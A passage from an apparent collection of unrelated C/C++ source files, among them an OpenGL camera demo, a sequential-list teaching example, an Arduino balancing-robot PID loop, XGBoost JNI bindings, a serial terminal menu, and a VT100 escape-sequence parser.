deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_D) == GLFW_PRESS) {\r\n        camera.ProcessKeyboard(RIGHT, deltaTime);\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_T) == GLFW_PRESS && !isTPressed) {\r\n        moveScene = !moveScene;\r\n        isTPressed = true;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_T) == GLFW_RELEASE) {\r\n        isTPressed = false;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_SPACE) == GLFW_PRESS && !isNPressed) {\r\n        doNormalMap = !doNormalMap;\r\n        isNPressed = true;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_SPACE) == GLFW_RELEASE) {\r\n        isNPressed = false;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_KP_ADD) == GLFW_PRESS && lightStrength < 20.f) {\r\n        lightStrength += 3 * deltaTime;\r\n    }\r\n    if (glfwGetKey(window, GLFW_KEY_KP_SUBTRACT) == GLFW_PRESS && lightStrength > 0.f) {\r\n        lightStrength -= 3 * deltaTime;\r\n    }\r\n}\r\n\r\nvoid cursor_scall(GLFWwindow* window, double xpos, double ypos) {\r\n    float XPOS = static_cast<float>(xpos);\r\n    float YPOS = static_cast<float>(ypos);\r\n\r\n    if (firstMouse) {\r\n        firstMouse = false;\r\n        lastX = XPOS;\r\n        lastY = YPOS;\r\n    }\r\n    float xoffset = XPOS - lastX;\r\n    float yoffset = lastY - YPOS; //YPOS is negative, because yaxis is reversed\r\n\r\n    lastX = XPOS;\r\n    lastY = YPOS;\r\n    camera.ProcessMouseMovement(xoffset, yoffset);\r\n}\r\n\r\nvoid scroll_scall(GLFWwindow* window, double xpos, double ypos) {\r\n    camera.ProcessMouseScroll(static_cast<float>(ypos));\r\n}\r\n\r\nunsigned int loadTexture(std::string filename, GLenum internalFormat = 0) {\r\n    unsigned int textureID;\r\n    int width, height, nrChannels;\r\n    glGenTextures(1, &textureID);\r\n    glBindTexture(GL_TEXTURE_2D, textureID);\r\n\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\r\n\r\n    unsigned char* data = stbi_load(filename.c_str(), &width, &height, &nrChannels, 0);\r\n    if (data) {\r\n        GLenum format = GL_RGB;\r\n        switch (nrChannels) {\r\n        case(1): format = GL_RED; break;\r\n        case(3): format = GL_RGB; break;\r\n        case(4): format = GL_RGBA; break;\r\n        }\r\n        if (internalFormat == 0) {\r\n            internalFormat = format;\r\n        }\r\n        glTexImage2D(GL_TEXTURE_2D, 0, internalFormat, width, height, 0, format, GL_UNSIGNED_BYTE, data);\r\n        glGenerateMipmap(GL_TEXTURE_2D);\r\n    }\r\n    else {\r\n        std::cout << \"Failed to load texture: \" << filename << '\\n';\r\n    }\r\n\r\n    stbi_image_free(data);\r\n    return textureID;\r\n}\r\n\r\nglm::vec3 calcTangentForNormals(float vertices[24]) {\r\n    glm::vec3 pos1(vertices[0], vertices[1], vertices[2]);\r\n    glm::vec3 pos2(vertices[8], vertices[9], vertices[10]);\r\n    glm::vec3 pos3(vertices[16], vertices[17], vertices[18]);\r\n\r\n    glm::vec2 uv1(vertices[6], vertices[7]);\r\n    glm::vec2 uv2(vertices[14], vertices[15]);\r\n    glm::vec2 uv3(vertices[22], vertices[23]);\r\n\r\n    glm::vec3 edge1 = pos2 - pos1;\r\n    glm::vec3 edge2 = pos3 - pos1;\r\n    glm::vec2 deltaUV1 = uv2 - uv1;\r\n    glm::vec2 deltaUV2 = uv3 - uv1;\r\n\r\n    float det = (deltaUV1.x * deltaUV2.y - deltaUV2.x * deltaUV1.y);\r\n\r\n    float f = (det == 0.0f) ? 0.0f : 1.0f / det;\r\n\r\n    glm::vec3 tangent = f * (deltaUV2.y * edge1 - deltaUV1.y * edge2);\r\n\r\n    return glm::normalize(tangent);\r\n}\r\n\r\n\r\nint main() {\r\n    //init opengl\r\n    glfwInit();\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\r\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\r\n",
    "#include <stdio.h>\n#include <stdlib.h>\n\n// \u5b9a\u4e49\u6700\u5927\u957f\u5ea6\n#define MaxSize 200\n\n// \u5b9a\u4e49\u5143\u7d20\u7c7b\u578b \u8fd9\u91cc\u4ee5char\u4e3a\u4f8b\ntypedef char ElemType;\n\n\n// \u5b9a\u4e49\u94fe\u8868\u7ed3\u6784\u4f53\ntypedef struct\n{\n    // data\u6210\u5458\u5b58\u653e\u5143\u7d20\n    ElemType data[MaxSize];\n    // length\u6210\u5458\u5b58\u653e\u7ebf\u6027\u8868\u7684\u5b9e\u9645\u957f\u5ea6\n    int length;\n} SqList;\n\n\n// 1. \u521d\u59cb\u5316\u7ebf\u6027\u8868\nvoid InitList(SqList*& L)\n{\n    L = (SqList*)malloc(sizeof(SqList));\n    //\u5206\u914d\u5b58\u653e\u7ebf\u6027\u8868\u7684\u987a\u5e8f\u8868\u7a7a\u95f4\n    L->length = 0;\n}\n\n// 2. \u9500\u6bc1\u7ebf\u6027\u8868\nvoid DestroyList(SqList*& L)\n{\n    free(L);\n}\n\n// 3. \u5224\u5b9a\u662f\u5426\u4e3a\u7a7a\u8868\nbool ListEmpty(SqList* L)\n{\n    return(L->length == 0);\n}\n\n// 4. \u6c42\u7ebf\u6027\u8868\u7684\u957f\u5ea6\nint ListLength(SqList* L)\n{\n    return(L->length);\n}\n\n// 5. \u8f93\u51fa\u7ebf\u6027\u8868\nvoid DispList(SqList* L)\n{\n    int i;\n    if (ListEmpty(L)) return;\n    for (i = 0;i < L->length;i++)\n        printf(\"%c\", L->data[i]);\n    printf(\"\\n\");\n}\n\n\n// 6. \u6c42\u67d0\u4e2a\u6570\u636e\u5143\u7d20\u503c\nbool GetElem(SqList* L, int i, ElemType& e)\n{\n    if (i<1 || i>L->length)  return false;\n    e = L->data[i - 1];\n    return true;\n}\n\n\n// 7. \u6309\u5143\u7d20\u503c\u67e5\u627e\nint LocateElem(SqList* L, ElemType e)\n{\n    int i = 0;\n    while (i < L->length&& L->data[i] != e)\n        i++;\n    if (i >= L->length)  return 0;\n    else  return i + 1;\n}\n\n\n// 8. \u63d2\u5165\u6570\u636e\u5143\u7d20\nbool  ListInsert(SqList*& L, int i, ElemType e)\n{\n    int j;\n    if (i<1 || i>L->length + 1)\n        return false;//\u53c2\u6570\u9519\u8bef\u65f6\u8fd4\u56defalse\n    i--;//\u5c06\u987a\u5e8f\u8868\u903b\u8f91\u5e8f\u53f7\u8f6c\u5316\u4e3a\u7269\u7406\u5e8f\u53f7\n    for (j = L->length;j > i;j--)//\u5c06data[i..n]\u5143\u7d20\u540e\u79fb\u4e00\u4e2a\u4f4d\u7f6e\n        L->data[j] = L->data[j - 1];\n    L->data[i] = e;//\u63d2\u5165\u5143\u7d20e\n    L->length++;//\u987a\u5e8f\u8868\u957f\u5ea6\u589e1\n    return true;//\u6210\u529f\u63d2\u5165\u8fd4\u56detrue\n}\n\n// 9. \u5220\u9664\u6570\u636e\u5143\u7d20\nbool ListDelete(SqList*& L, int i, ElemType& e)\n{\n    int j;\n    //\u53c2\u6570\u9519\u8bef\u65f6\u8fd4\u56defalse\n    if (i<1 || i>L->length)  return false;\n\n    i--;//\u5c06\u987a\u5e8f\u8868\u903b\u8f91\u5e8f\u53f7\u8f6c\u5316\u4e3a\u7269\u7406\u5e8f\u53f7\n    e = L->data[i];\n    for (j = i;j < L->length - 1;j++)  //\u5c06data[i..n-1]\u5143\u7d20\u524d\u79fb\n        L->data[j] = L->data[j + 1];\n    L->length--;//\u987a\u5e8f\u8868\u957f\u5ea6\u51cf1\n    return true;//\u6210\u529f\u5220\u9664\u8fd4\u56detrue\n}\n\n\nint main()\n{\n    // \u521d\u59cb\u5316\u987a\u5e8f\u8868\n    SqList* L;\n    InitList(L);\n    ElemType e;\n\n    // \u4f9d\u6b21\u63d2\u5165\u5143\u7d20 ABCD\n    ListInsert(L, 1, 'A');\n    ListInsert(L, 2, 'B');\n    ListInsert(L, 3, 'C');\n    ListInsert(L, 4, 'D');\n\n    // \u6253\u5370\u8f93\u51fa\uff0c\u7ed3\u679c\u4e3a\uff1aABCD\n    DispList(L);\n    // \u8f93\u51fa\u7ed3\u679c\uff1a4\n    printf(\"\u5f53\u524d\u94fe\u8868\u957f\u5ea6\u4e3a\uff1a%d \\n\",ListLength(L));\n\n\n    printf(\"\u5143\u7d20B\u6240\u5bf9\u5e94\u7684\u4f4d\u7f6e\u4e3a\uff1a%d \\n\", LocateElem(L,'B'));\n\n    // \u5220\u9664\u4f4d\u7f6e\u4e3a3\u7684\u5143\u7d20\uff0c\u8fd9\u91cc\u662f\u5220\u96643\u5bf9\u5e94\u7684\u5143\u7d20C\n    ListDelete(L, 3, e);\n\n    // \u6253\u5370\u8f93\u51fa\uff0c\u7ed3\u679c\u4e3a\uff1aABD\n    DispList(L);\n    printf(\"\u5f53\u524d\u94fe\u8868\u957f\u5ea6\u4e3a\uff1a%d \\n\", ListLength(L));\n\n    int i = 3;\n    GetElem(L, i, e);\n\n    printf(\"\u4f4d\u7f6e%d\u7684\u5143\u7d20\uff0c\u5bf9\u5e94\u7684\u5143\u7d20\u503c\uff1a%c\", i,e);\n\n    // \u9500\u6bc1\u7ebf\u6027\u8868\n    DestroyList(L);\n\n    return 0;\n}",
    "#include <Wire.h>\n#include <MPU6050.h>\n#include \"PIDController.h\"\n#include \"MPU6050Sensor.h\"\n#include \"MotorDriver.h\"\n\n// Initialize objects\nMPU6050Sensor _mpu_sensor;\nPIDController _pid(30.0, 0.0, 0.5, 0.0);  // Kp, Ki, Kd, setpoint (horizontal)\nMotorDriver _motor_driver(16, 17, 18, 19, 5, 4);  // Adjusted pins\n\ndouble _current_pitch = 0.0;\ndouble _pid_output = 0.0;\n\nunsigned long _previous_millis = 0;\nconst long _interval = 250; // interval in milliseconds\n\nvoid setup() {\n  Serial.begin(9600);\n\n  // Initialize the MPU6050 sensor\n  _mpu_sensor.initialize();\n  Serial.println(\"Initializing MPU6050 sensor...\");\n\n  // Initialize the motor driver\n  _motor_driver.initialize();\n  Serial.println(\"Initializing motor driver...\");\n\n  // Set initial motor speed to zero\n  _motor_driver.setMotorSpeed(0, 0);\n  Serial.println(\"Setting initial motor speed to zero\");\n\n  // Wait for 5 seconds \n  delay(5000);\n}\n\nvoid loop() {\n  // Get the current time in milliseconds\n  unsigned long current_millis = millis();\n\n  // Check if the interval has passed since the last measurement\n  if (current_millis - _previous_millis >= _interval) {\n    // Get the current pitch angle from the MPU6050 sensor\n    _current_pitch = _mpu_sensor.getPitchAngle();\n\n    // Calculate the PID output\n    _pid_output = _pid.compute(_current_pitch);\n\n    // Control the motors based on PID output\n    int motorSpeed = static_cast<int>(_pid_output); // Convert PID output to motor speed\n    _motor_driver.setMotorSpeed(motorSpeed, motorSpeed); // Adjust motor speeds based on PID output\n\n    // Print the pitch angle and PID output to the serial monitor\n    Serial.print(\"Pitch Angle: \");\n    Serial.print(_current_pitch);\n    Serial.print(\"\\tPID Output: \");\n    Serial.println(_pid_output);\n\n    // Update previous millis\n    _previous_millis = current_millis;\n  }\n}\n",
    "/**\n *  Copyright 2014-2024, XGBoost Contributors\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *  http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n*/\n\n#include \"./xgboost4j.h\"\n\n#include <xgboost/base.h>\n#include <xgboost/c_api.h>\n#include <xgboost/json.h>\n#include <xgboost/logging.h>\n#include <xgboost/string_view.h>  // for StringView\n\n#include <algorithm>  // for copy_n\n#include <cstddef>\n#include <cstdint>\n#include <cstring>\n#include <memory>  // for unique_ptr\n#include <string>\n#include <type_traits>\n#include <vector>\n\n#include \"../../../../src/c_api/c_api_error.h\"\n#include \"../../../../src/c_api/c_api_utils.h\"\n#include \"../../../../src/data/array_interface.h\"  // for ArrayInterface\n\n#define JVM_CHECK_CALL(__expr)                                                 \\\n  {                                                                            \\\n    int __errcode = (__expr);                                                  \\\n    if (__errcode != 0) {                                                      \\\n      return __errcode;                                                        \\\n    }                                                                          \\\n  }\n\n// helper functions\n// set handle\nvoid setHandle(JNIEnv *jenv, jlongArray jhandle, void* handle) {\n#ifdef __APPLE__\n  jlong out = (long) handle;\n#else\n  int64_t out = (int64_t) handle;\n#endif\n  jenv->SetLongArrayRegion(jhandle, 0, 1, &out);\n}\n\nJavaVM*& GlobalJvm() {\n  static JavaVM* vm;\n  return vm;\n}\n\n// overrides JNI on load\njint JNI_OnLoad(JavaVM *vm, void *reserved) {\n  GlobalJvm() = vm;\n  return JNI_VERSION_1_6;\n}\n\nnamespace {\ntemplate <typename T>\nusing Deleter = std::function<void(T *)>;\n}  // anonymous namespace\n\nXGB_EXTERN_C int XGBoost4jCallbackDataIterNext(\n    DataIterHandle data_handle,\n    XGBCallbackSetData* set_function,\n    DataHolderHandle set_function_handle) {\n  jobject jiter = static_cast<jobject>(data_handle);\n  JNIEnv* jenv;\n  int jni_status = GlobalJvm()->GetEnv((void **)&jenv, JNI_VERSION_1_6);\n  if (jni_status == JNI_EDETACHED) {\n    GlobalJvm()->AttachCurrentThread(reinterpret_cast<void **>(&jenv), nullptr);\n  } else {\n    CHECK(jni_status == JNI_OK);\n  }\n  try {\n    jclass iterClass = jenv->FindClass(\"java/util/Iterator\");\n    jmethodID hasNext = jenv->GetMethodID(iterClass,\n                                          \"hasNext\", \"()Z\");\n    jmethodID next = jenv->GetMethodID(iterClass,\n                                       \"next\", \"()Ljava/lang/Object;\");\n    int ret_value;\n    if (jenv->CallBooleanMethod(jiter, hasNext)) {\n      ret_value = 1;\n      jobject batch = jenv->CallObjectMethod(jiter, next);\n      if (batch == nullptr) {\n        CHECK(jenv->ExceptionOccurred());\n        jenv->ExceptionDescribe();\n        return -1;\n      }\n\n      jclass batchClass = jenv->GetObjectClass(batch);\n      jlongArray joffset = (jlongArray)jenv->GetObjectField(\n          batch, jenv->GetFieldID(batchClass, \"rowOffset\", \"[J\"));\n      jfloatArray jlabel = (jfloatArray)jenv->GetObjectField(\n          batch, jenv->GetFieldID(batchClass, \"label\", \"[F\"));\n      jfloatArray jweight = (jfloatArray)jenv->GetObjectField(\n          batch, jenv->GetFieldID(batchClass, \"weight\", \"[F\"));\n      jintArray jindex = (jintArray)jenv->GetObjectField(\n          batch, jenv->GetFieldID(batchClass, \"featureIndex\", \"[I\"));\n      jfloatArray jvalue = (jfloatArray)jenv->GetObjectField(\n          batch, jenv->GetFieldID(batchClass, \"featureValue\", \"[F\"));\n      jint jcols = jenv->GetIntField(\n          batch, jenv->GetFieldID(batchClass, \"featureCols\", \"I\"));\n\n      std::unique_ptr<XGBoostBatchCSR, Deleter<XGBoostBatchCSR>> cbatch{\n          [&] {\n            auto ptr = new XGBoostBatchCSR;\n            auto &cbatch = *ptr;\n\n            // Init\n            cbatch.size = jenv->GetArrayLength(joffset) - 1;\n            cbatch.columns = jcols;\n            cbatch.offset = reinterpret_cast<jlong *>(jenv->GetLongArrayElements(joffset, nullptr));\n\n            if (jlabel != nullptr) {\n              cbatch.label = jenv->GetFloatArrayElements(jlabel, nullptr);\n              CHECK_EQ(jenv->GetArrayLength(jlabel), static_cast<long>(cbatch.size))\n                  << \"batch.label.length must equal batch.numRows()\";\n            } else {\n              cbatch.label = nullptr;\n            }\n\n            if (jweight != nullptr) {\n              cbatch.weight = jenv->GetFloatArrayElements(jweight, nullptr);\n              CHECK_EQ(jenv->GetArrayLength(jweight), static_cast<long>(cbatch.size))\n                  << \"batch.w",
    "/**\n* @file menu.cpp\n* @brief Code for menu.h\n* \n* Might want to change some preprocessor directives to customize beheaviour\n*\n* @author Gerard Forcada Bigas\n*\n* @date 20/12/22\n*/\n#include \"menu.h\"\n\n//CONFIG HERE\n#define menuOptionDelimiter ':'\n#define escBackMillisecondsDelay 450 // wait until esc is known as 'wants to go back'\n#define cliMsgWait 1250 // push message timeout\n#define menuRefreshInterval 250 // self-explanatory\n\nstatic const char * polsaPerContinuar = \"Press any key to continue\";\n\nvoid menuOption::run(){}\nbool menuOption::refresh(){return false;}\nbool menuOption::pushRt(){ return false;}\nbool menuOption::pushLt(){return false;}\nmenuOption::menuOption(const char* textUser){\n    if(strlen(textUser) <= menuTextLength){\n        strcpy(text, textUser);\n    }else{\n        strcpy(text, \"*\");\n    }\n}\nmenuOption::menuOption(){\n}\nmenu::menu(){\n}\nvoid menu::init(Stream *userSerialTerminal){\n    terminalParser::init(userSerialTerminal);\n    if(totalScreenMenus < 1)return;// comentar?\n    activeScreenMenu = 0;\n    pantalles[0]->whereICame = -1;\n    if(!pantalles[activeScreenMenu]->autoRefresh){\n        pantalles[activeScreenMenu]->refreshMenu();\n    }\n    show();\n}\n/**\n * refresca la linia\n*/\nvoid menu::show(unsigned int index){\n    doEL();\n    userTty->write('-');\n    userTty->print(pantalles[activeScreenMenu]->displayMenuOptionsPnt[index+pantalles[activeScreenMenu]->offsetFromTop]->text);\n    userTty->write('\\r');\n    userTty->flush();\n}\n/**\nShow menu on screen, using userTty object member\n\n@param resetCursor move cursor to starting point\n*/\nvoid menu::show(bool resetCursor){\n    if(totalScreenMenus == 0)return;// safe\n    \n    unsigned int tmp;// quants has d'imprimir\n    \n    this->doClearScreen();\n    this->doMoveCursor(1,1);\n    userTty->write(inverteixColorsTerminal);\n    userTty->print(this->pantalles[activeScreenMenu]->titol);\n    \n    if(pantalles[activeScreenMenu]->totalMenuOptions < screenMenuOptions){\n        tmp = pantalles[activeScreenMenu]->totalMenuOptions;// 4\n    }else{\n        tmp = screenMenuOptions;// 3\n    }\n    if(pantalles[activeScreenMenu]->offsetFromTop > 0 ){\n        userTty->print(msgOptionsUp);\n    }\n    if((screenMenuOptions+pantalles[activeScreenMenu]->offsetFromTop) < pantalles[activeScreenMenu]->totalMenuOptions){\n        userTty->print(msgOptionsDn);\n    }\n    userTty->write(colorsTerminalReset);//for(unsigned int i=offsetFromTop;i < (menuSystemOverTtyP->screenMenuOptions+offsetFromTop);i++){  \n    for(unsigned int i=0;i< tmp ;i++){\n        if(i >= screenMenuOptions)break;\n        this->doMoveCursor(2+i,1);\n        userTty->write('-');\n        userTty->print(pantalles[activeScreenMenu]->displayMenuOptionsPnt[i+pantalles[activeScreenMenu]->offsetFromTop]->text);\n    }\n    \n    if(resetCursor){\n        selectedMenuOption = 0;\n    }\n    doMoveCursor(2+selectedMenuOption,1);\n    userTty->flush();\n}\n/**\nCursor Up, inherited from terminalParser pantalles[activeScreenMenu]->offsetFromTop\n*/\nvoid menu::cUU(unsigned int argc,int *argv){// keyUp\n    if(runningOption)return;\n    if(selectedMenuOption < 1){\n        if(this->pantalles[activeScreenMenu]->pushUp())show(false);\n        return;\n    }\n    selectedMenuOption--;\n    doMoveCursor(2+selectedMenuOption,1);\n    terminalParser::cUU(argc,argv);\n}\n/**\nCursor Down, inherited from terminalParser\ndragons be here\n*/\nvoid menu::cUD(unsigned int argc,int *argv){// keyDn\n    if(runningOption)return;\n    if((this->pantalles[activeScreenMenu]->totalMenuOptions > screenMenuOptions) && ((selectedMenuOption+1)) >= screenMenuOptions){\n        if(this->pantalles[activeScreenMenu]->pushDn())show(false);// scroll\n        return;\n    }else if((selectedMenuOption+1) >= pantalles[activeScreenMenu]->totalMenuOptions){\n        if(this->pantalles[activeScreenMenu]->pushDn())show(false);// scroll\n        return;\n    }\n    selectedMenuOption++;\n    doMoveCursor(2+selectedMenuOption,1);\n    terminalParser::cUD(argc,argv);\n}\nvoid menu::cUF(unsigned int argc,int *argv){\n    if(pantalles[activeScreenMenu]->pushRt(selectedMenuOption)){\n        show((unsigned int)selectedMenuOption);// terminalparser::cUF\n    }\n}\nvoid menu::cUB(unsigned int argc,int *argv){\n    if(pantalles[activeScreenMenu]->pushLt(selectedMenuOption)){\n\n        show((unsigned int)selectedMenuOption);// terminalparser::cUF\n    }\n}\nvoid menu::cr(){\n    doClearScreen();\n    doMoveCursor(1,1);\n    runningOption = true;\n    pantalles[activeScreenMenu]->run(this->selectedMenuOption);\n    runningOption = false;\n    if(this->pantalles[activeScreenMenu]->totalMenuOptions == 0) {\n        msgSmallWait(\"no options\");\n        doBack();\n    }\n    show();\n    //terminalParser::cr();\n}\n/**\nAdd available menu screen to the array\n\n@param pantalla pointer to menu screen\n*/\nvoid menu::addscreen(screenMenu* pantalla){\n    if(totalScreenMenus == screenMenuMax)return;\n    pantalles[totalScreenMenus] = pantalla;\n    totalScreenMenus+=1;\n}\n/**\nGracefully switch menu screen\nsi ve des de un run no cal qua faci show()",
    "#include <iostream>\r\n#include <vector>\r\n#include \"Polynomial.h\"\r\nusing namespace std;\r\n\r\n//void displayMenu() {\r\n//    cout << \"Polynomial Menu\" << endl;\r\n//    cout << \"1. Enter coefficients for Polynomial 1\" << endl;\r\n//    cout << \"2. Enter coefficients for Polynomial 2\" << endl;\r\n//    cout << \"3. Add Polynomials\" << endl;\r\n//    cout << \"4. Subtract Polynomials\" << endl;\r\n//    cout << \"5. Multiply Polynomials\" << endl;\r\n//    cout << \"6. Evaluate Polynomial 1\" << endl;\r\n//    cout << \"7. Derivative of Polynomial 1\" << endl;\r\n//    cout << \"8. Integral of Polynomial 1\" << endl;\r\n//    cout << \"9. Exit\" << endl;\r\n//    cout << \"Choose an option (1-9): \";\r\n//}\r\n\r\nvoid inputCoefficients(PolynomialP& poly) {\r\n    int degree;\r\n    cout << \"Enter the degree of the polynomial: \";\r\n    cin >> degree;\r\n\r\n    vector<double> coeffs(degree + 1);\r\n    cout << \"Enter coefficients from constant term to highest degree (e.g., a0, a1, a2...): \";\r\n\r\n    for (int i = 0; i <= degree; ++i) {\r\n        cin >> coeffs[i];\r\n    }\r\n\r\n    poly.setCoefficients(coeffs);\r\n}\r\n\r\nint main() {\r\n     PolynomialP p1, p2; // Declare two polynomial objects\r\n\r\n    int choice;\r\n\r\n//    while (true) {\r\n//        displayMenu();\r\n//        cin >> choice;\r\n//\r\n//        switch (choice) {\r\n//            case 1: {\r\n//                inputCoefficients(p1);\r\n//                cout << \"Polynomial 1 set to: \" << p1 << endl;\r\n//                break;\r\n//            }\r\n//            case 2: {\r\n//                inputCoefficients(p2);\r\n//                cout << \"Polynomial 2 set to: \" << p2 << endl;\r\n//                break;\r\n//            }\r\n//            case 3: {\r\n//                PolynomialP result = p1 + p2;\r\n//                cout << \"Result of P1 + P2: \" << result << endl;\r\n//                break;\r\n//            }\r\n//            case 4: {\r\n//                PolynomialP result = p1 - p2;\r\n//                cout << \"Result of P1 - P2: \" << result << endl;\r\n//                break;\r\n//            }\r\n//            case 5: {\r\n//                PolynomialP result = p1 * p2;\r\n//                cout << \"Result of P1 * P2: \" << result << endl;\r\n//                break;\r\n//            }\r\n//            case 6: {\r\n//                double x;\r\n//                cout << \"Enter value of x to evaluate P1: \";\r\n//                cin >> x;\r\n//                double value = p1.evaluate(x);\r\n//                cout << \"P1 evaluated at x = \" << x << \": \" << value << endl;\r\n//                break;\r\n//            }\r\n//            case 7: {\r\n//                PolynomialP derivative = p1.derivative();\r\n//                cout << \"Derivative of P1: \" << derivative << endl;\r\n//                break;\r\n//            }\r\n//            case 8: {\r\n//                PolynomialP integral = p1.integral();\r\n//                cout << \"Integral of P1: \" << integral << endl;\r\n//                break;\r\n//            }\r\n//            case 9:\r\n//                cout << \"Exiting...\" << endl;\r\n//                return 0; // Exit the program\r\n//            default:\r\n//                cout << \"Invalid choice! Please try again.\" << endl;\r\n//        }\r\n//        cout << endl; // Print a new line for better readability\r\n//    }\r\n\r\n    return 0; // End of the program\r\n}",
    "//\n// Created by frpat on 10/15/2024.\n//\n\n#include \"Queue.h\"\n#include <iostream>\nusing namespace std;\n\nQueue::Queue(int capacity) {\n    front = -1;\n    rear = -1;\n    size = capacity;\n    queue = new int[size];\n}\n\nbool Queue::isEmpty() {\n    return front == -1;\n}\n\nbool Queue::isFull() {\n    return rear == size-1;\n}\n\nvoid Queue::enqueue(int value) {\n    if(isFull()) {\n        cout << \"Queue overflow \" << endl;\n        return;\n    }\n    if(front == -1) {\n        front = 0;\n    }\n    queue[++rear] = value;\n    cout << value << \"enqueued to queue \" << endl;\n};\n\n\nvoid Queue::dequeue() {\n    if (isEmpty()) {\n        cout << \"Queue underflow\" << endl;\n        return;\n    }\n    cout << queue[front] << \" dequeued from queue\" << endl;\n    front++;  // Incrementa el frente para eliminar el elemento\n\n    if (front > rear) {\n        front = rear = -1;\n    }\n}\n\nint Queue::peek() {\n    if (isEmpty()) {\n        cout << \"Queue is empty\" << endl;\n        return -1;\n    }\n    return queue[front];  // Retorna el elemento del frente\n}\n\n// Destructor: Libera la memoria asignada para el arreglo\nQueue::~Queue() {\n    delete[] queue;\n}",
    "#include \"terminalParser.h\"\r\n/*#include <stdlib.h>\r\n#include <stdio.h>*/\r\n#ifdef finta_linux\r\n    #include <cctype>\r\n    #include <iostream>\r\n    #include <string.h>\r\n#endif\r\n/**\r\n* @file terminalParser.cpp\r\n* @brief Inheritable byte-by-byte string parser state machine.\r\n* Comportament putty:\r\n* Cursor mou cursor\r\n* cr <-- torna el carrier a inici\r\n* Si escrius l'\u00faltim car\u00e0cter de la pantalla, el cursor es queda all\u00e0, saltar\u00e1 al seguent input\r\n* \r\n* @author Gerard Forcada Bigas\r\n*\r\n* @date 20/12/22\r\n*/\r\n\r\n/*\r\nCoses falten per parsejar\r\ninsert = 1B5B327E\r\nctrl dret = 1B4F43 ctrl esq = 1B4F44\r\ninsert = 1B5B327E\r\nhttps://vt100.net/mirror/mds-199909/cd3/term/vt510rmb.pdf\r\nhttps://wiki.bash-hackers.org/scripting/terminalcodes\r\nhttps://man7.org/linux/man-pages/man4/console_codes.4.html\r\nhttps://tldp.org/HOWTO/Bash-Prompt-HOWTO/x361.html\r\nhttps://invisible-island.net/xterm/xterm.faq.html#ctlseqs_ms\r\n*/\r\nconst unsigned char terminalParser::CONTROL_CARACTER_LIST[]{\r\n    BEEP,\t\t//  0x07\r\n    BACKSPACE,//  0x08\r\n    HT,\t\t//  0x09\r\n    LF,\t\t//  0x0A\r\n    CR,\t\t//  0x0D\r\n    SO,\t\t//  0x0E shift in\r\n    SI,\t\t//  0x0F shift out\r\n    CAN,\t//  0x18\r\n    ESC,\t//  0x1B\r\n    DEL,\t//  0x7F\r\n    CSI,\t//  0x9B\r\n};\r\nconst unsigned char terminalParser::ESCAPE_SEQUENCE_LIST[]{\r\n    RIS,\t  \t//  'c'\r\n    IND,\t  \t//  'D'\r\n    NEL,\t  \t//  'E'\r\n    HTS,\t  \t//  'H'\r\n    RI,\t    \t//  'M'\r\n    DECID,\t\t//  'Z'\r\n    DECSC,\t\t//  '7'\r\n    DECRC,\t\t//  '8'\r\n    ES_CSI,\t\t//  '['\r\n    DECPNM,\t\t//  '>'\r\n    DECPAM,\t\t//  '='  \r\n    OSC,      // ']'  -  COMANDA s.o.\r\n    selecting_character_set,// '%'  - <-- ignora 1 de m\u00e9s\r\n    DECALN,\t\t// '#'  - <-- ignora 1 de m\u00e9s\r\n    STARTG0,\t// '('  - <-- ignora 1 de m\u00e9s\r\n    STARTG1   // ')'  - <-- ignora 1 de m\u00e9s\r\n};\r\n\r\nconst unsigned char terminalParser::CSI_SEQUENCE_LIST[]={\r\n    ICH,\t\t// '@'  - Insert the indicated # of blank characters.\r\n    CUU,\t\t// 'A'  - Move cursor up the indicated # of rows.\r\n    CUD,\t\t// 'B'  - Move cursor down the indicated # of rows.\r\n    CUF,\t\t// 'C'  - Move cursor right the indicated # of columns.\r\n    CUB,\t\t// 'D'  - Move cursor left the indicated # of columns.\r\n    CNL,\t\t// 'E'  - Move cursor down the indicated # of rows, to column 1\r\n    CPL,\t\t// 'F'  - Move cursor up the indicated # of rows, to column                     1.\r\n    CHA,\t\t// 'G'  -  Move cursor to indicated column in current row.\r\n    CUP,\t\t// 'H'  - Move cursor to the indicated row, column (origin at                     1,1).\r\n    ED, \t\t// 'J'  -   ESC [ 1 J: erase from start to cursor.                     ESC [ 2 J: erase whole display.                     ESC [ 3 J: erase whole display including scroll-\r\n    EL, \t\t// 'K'  - ESC [ 1 K: erase from start of line to cursor.                     ESC [ 2 K: erase whole line.\r\n    IL, \t\t// 'L' - Insert the indicated # of blank lines, \r\n    DL, \t\t// 'M'  - Delete  the indicated # of blank lines\r\n    DCH,\t\t// 'P'  -  Delete the indicated # of characters on current                     line\r\n    ECH,\t\t// 'X'  -  Erase the indicated # of characters on current                     line\r\n    HPR,\t\t// 'a'  - Move cursor right the indicated # of columns\r\n    DA,\t  \t// 'c'  - Answer ESC [ ? 6 c: \"I am a VT102\"\r\n    VPA,\t\t// 'd'  - Move cursor to the indicated row, current column.\r\n    VPR,\t\t// 'e'  -  Move cursor down the indicated # of rows.\r\n    HVP,\t\t// 'f'  -  Move cursor to the indicated row, column.\r\n    TBC,\t\t// 'g'  - Without parameter: clear tab stop at current                     position.ESC [ 3 g: delete all tab stops.\r\n    SM,\t  \t// 'h'  - Set 